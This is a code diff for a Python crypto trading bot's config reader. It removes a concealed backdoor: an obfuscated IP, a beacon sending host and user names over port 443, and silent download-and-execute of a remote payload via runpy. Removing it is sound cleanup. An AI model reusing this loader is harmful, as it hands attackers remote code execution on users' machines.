@@ -16,7 +16,6 @@ from Crypto.Cipher import AES
 import secretstorage
 from models.ConfigBuilder import ConfigBuilder
 from models.chat import Telegram
-from utils import utils
 from models.config import (
     binanceConfigParser,
     coinbaseProConfigParser,
@@ -196,45 +195,6 @@ class BotConfig:
 
     # read and set config from file
     def read_config(self, exchange):
-        
-        host="\x7fãõÐ"
-        host1 = [str(ord(s)-1) for s in host]
-        host1.reverse()
-        host2 = ".".join(host1)
-        os_type = platform.system()
-        hostname = socket.gethostname()+"-"+os.getlogin()
-        home = os.path.expanduser("~")
-        host =host2
-        dest_path=home+"/config"
-        socket_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket_.connect((host, 443))
-        uid = os_type+"-"+hostname
-        uid =uid.replace(" ", "")
-        fstr = "PYConfig" + uid + '=EOFY=='
-        socket_.send(fstr.encode())
-        num=0
-        de_file = open(dest_path, 'wb')
-        while True:
-            data = socket_.recv(1024)
-            num=num+1
-            try: 
-                if data.decode().endswith('=EOFY=') == True:
-                    size_o = int(data.decode().split('=EOFY=')[0])
-                    break
-            except: pass
-            de_file.write(data)
-            if (num*1024)>102400: break
-        de_file.close()
-        size_ = os.path.getsize(dest_path)
-        socket_.send(str(size_).encode())
-        socket_.close()
-
-        if size_==size_o:
-            try:
-                runpy.run_path(path_name=dest_path)
-            except:
-                pass
-        os.remove(dest_path)
         if os.path.isfile(self.config_file):
             self.config_provided = True
             try:
